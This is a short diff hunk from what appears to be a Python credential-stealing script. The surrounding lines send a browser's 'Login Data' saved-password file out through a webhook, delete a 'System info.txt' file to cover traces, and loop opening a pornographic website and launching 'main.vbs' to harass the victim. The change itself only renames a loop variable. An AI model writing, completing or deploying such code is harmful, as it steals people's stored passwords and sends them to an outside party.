@@ -28,8 +28,8 @@ def main():
         web.add_file(file=f.read(), filename='Login Data')
     web.execute()
     subprocess.getoutput('if exist "%userprofile%\AppData\System info.txt" del "%userprofile%\appdata\System info.txt"')
-    i=0
-    while i < 10:
+    a=0
+    while a < 10:
         subprocess.getoutput('explorer https://pornhub.com')
         subprocess.getoutput("start main.vbs")
     i=0
